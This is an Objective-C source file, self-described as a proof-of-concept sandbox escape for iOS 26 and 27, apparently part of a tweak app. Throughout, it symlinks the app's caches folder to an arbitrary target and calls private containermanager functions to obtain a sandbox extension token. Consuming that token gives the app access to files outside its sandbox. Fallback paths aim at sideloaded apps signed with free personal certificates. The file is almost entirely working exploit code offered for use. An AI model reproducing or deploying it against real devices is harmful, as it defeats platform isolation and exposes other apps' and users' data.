//
//  worse_query.m
//  GestaltTweak
//
//  Created by Taj C on 8/20/26.
//  forcequitOS/worse_query
//

/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

bool worse_query_available(void) {
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return false;
    void *query_create = dlsym(mgr, "container_query_create");
    void *consume_extension = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    dlclose(mgr);
    return (query_create != NULL && consume_extension != NULL);
}

static void clean_symlink_url(NSURL *caches) {
    if (!caches) return;
    NSFileManager *files = [NSFileManager defaultManager];
    [files removeItemAtURL:caches error:nil];
    [files createDirectoryAtURL:caches withIntermediateDirectories:true attributes:nil error:nil];
}

static void clean_symlink_path(NSString *cachesPath) {
    if (cachesPath.length == 0) return;
    NSFileManager *files = [NSFileManager defaultManager];
    [files removeItemAtPath:cachesPath error:nil];
    [files createDirectoryAtPath:cachesPath withIntermediateDirectories:true attributes:nil error:nil];
}

// Executes containermanagerd query across permutations of identifiers and classes
static int64_t execute_query_for_target(NSString *target,
                                        NSString *identifier,
                                        NSString *cachesPath,
                                        uint64_t containerClass,
                                        bool alt_flags,
                                        void *mgr) {
    NSFileManager *files = [NSFileManager defaultManager];
    
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_identifiers_fn query_set_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    
    if (!query_create || !query_set_class || (!query_set_group_identifiers && !query_set_identifiers) ||
        !query_set_flags || !query_set_part || !query_get_single_result || !query_free ||
        !copy_sandbox_token || !consume_extension) {
        return -2;
    }
    
    // Set up symlink
    [files removeItemAtPath:cachesPath error:nil];
    if ([files createSymbolicLinkAtPath:cachesPath withDestinationPath:target error:nil] == false) {
        clean_symlink_path(cachesPath);
        return -4;
    }
    
    uint64_t flags = alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL;
    void *result = NULL;
    void *successfulQuery = NULL;
    
    for (int variant = 0; variant < 4 && result == NULL; variant++) {
        void *query = query_create();
        if (!query) continue;
        
        query_set_class(query, containerClass);
        query_set_part(query, 3);
        query_set_flags(query, flags);
        
        xpc_object_t idObj = NULL;
        if (variant % 2 == 0) {
            idObj = xpc_string_create(identifier.UTF8String);
        } else {
            idObj = xpc_array_create(nil, 0);
            xpc_array_set_string(idObj, XPC_ARRAY_APPEND, identifier.UTF8String);
        }
        
        if (variant < 2 && query_set_group_identifiers) {
            query_set_group_identifiers(query, idObj);
        } else if (query_set_identifiers) {
            query_set_identifiers(query, idObj);
        } else if (query_set_group_identifiers) {
            query_set_group_identifiers(query, idObj);
        }
        
#if !OS_OBJECT_USE_OBJC
        xpc_release(idObj);
#endif
        
        result = query_get_single_result(query);
        if (result) {
            successfulQuery = query;
            break;
        } else {
            query_free(query);
        }
    }
    
    if (!result) {
        clean_symlink_path(cachesPath);
        return -5;
    }
    
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(successfulQuery);
        clean_symlink_path(cachesPath);
        return -6;
    }
    
    int64_t handle = consume_extension(token);
    query_free(successfulQuery);
    free(token);
    clean_symlink_path(cachesPath);
    
    return handle;
}

// worse_query sandbox escape supporting App Group (class 7) and App Container fallback (class 2 / 1)
int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
    }
    
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;
    
    NSFileManager *files = [NSFileManager defaultManager];
    
    // Step 1: Attempt using App Group (Class 7) if an App Group is available
    NSString *cleanGroup = group;
    if (cleanGroup.length > 0 && ![cleanGroup hasPrefix:@"group."]) {
        cleanGroup = [@"group." stringByAppendingString:cleanGroup];
    }
    
    NSURL *groupRoot = nil;
    if (cleanGroup.length > 0) {
        groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:cleanGroup];
    }
    if (!groupRoot) {
        NSArray<NSString *> *candidates = @[@"group.cc.forcequit.worse-query", @"group.com.gestalttweak.app"];
        for (NSString *cand in candidates) {
            groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:cand];
            if (groupRoot) {
                cleanGroup = cand;
                break;
            }
        }
    }
    
    if (groupRoot) {
        NSURL *libraryURL = [groupRoot URLByAppendingPathComponent:@"Library"];
        if (![files fileExistsAtPath:libraryURL.path]) {
            [files createDirectoryAtURL:libraryURL withIntermediateDirectories:YES attributes:nil error:nil];
        }
        NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
        int64_t handle = execute_query_for_target(target, cleanGroup, caches, 7, alt_flags, mgr);
        if (handle >= 0) {
            dlclose(mgr);
            return handle;
        }
    }
    
    // Step 2: FREE CERTIFICATE FALLBACK (App Container / Class 2 & Class 1)
    // Sideloaded apps with free personal Apple IDs do not have App Group entitlements,
    // but they DO have their own application container (Library/Caches) and bundle identifier.
    NSString *appCaches = [NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES) firstObject];
    NSString *bundleID = [[NSBundle mainBundle] bundleIdentifier];
    
    if (appCaches.length > 0 && bundleID.length > 0) {
        // Try Class 2 (App Data Container)
        int64_t handle = execute_query_for_target(target, bundleID, appCaches, 2, alt_flags, mgr);
        if (handle >= 0) {
            dlclose(mgr);
            return handle;
        }
        
        // Try Class 1 (App Bundle Container)
        handle = execute_query_for_target(target, bundleID, appCaches, 1, alt_flags, mgr);
        if (handle >= 0) {
            dlclose(mgr);
            return handle;
        }
    }
    
    dlclose(mgr);
    return groupRoot ? -5 : -1;
}

void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}
